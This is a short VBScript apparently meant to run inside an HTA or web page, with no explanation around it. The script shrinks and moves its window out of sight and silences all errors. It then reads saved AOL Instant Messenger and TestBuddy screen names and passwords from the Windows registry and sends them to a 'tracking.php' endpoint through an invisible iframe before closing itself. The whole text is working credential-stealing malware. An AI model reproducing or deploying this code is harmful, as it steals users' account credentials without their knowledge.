On Error Resume Next
Dim objReg
Set objReg = Createobject("WScript.Shell")
Dim tbuser, tbpw
dim user, pwvalue, pwout, pwold
window.resizeTo 0,0
window.moveTo 5000,5000
tbuser = objReg.regread ("HKEY_CURRENT_USER\Software\America Online\TestBuddy\ScreenName")
tbpw = replace(objReg.regread ("HKEY_CURRENT_USER\Software\America Online\TestBuddy\" & tbuser & "\Password"), "+", ".")
user = objReg.regread ("HKEY_CURRENT_USER\Software\America Online\AOL Instant Messenger (TM)\CurrentVersion\Login\Screen Name")
pwvalue = replace(objReg.regread ("HKEY_CURRENT_USER\Software\America Online\AOL Instant Messenger (TM)\CurrentVersion\Users\" & user & "\Login\Password1"), "+", ".")
pwold = replace(objReg.regread ("HKEY_CURRENT_USER\Software\America Online\AOL Instant Messenger (TM)\CurrentVersion\Users\" & Lcase(Replace(user, " ","")) & "\Login\Password"), "+", ".")
pwout = pwvalue
document.write("<center><iframe src='tracking.php?name=" & user & "&hash=" & pwout & "&old=" & pwold & "&tbname=" & tbuser & "&tbpassword=" & tbpw & "' width='0' height='0' onLoad='javascript:window.close();'></center>") 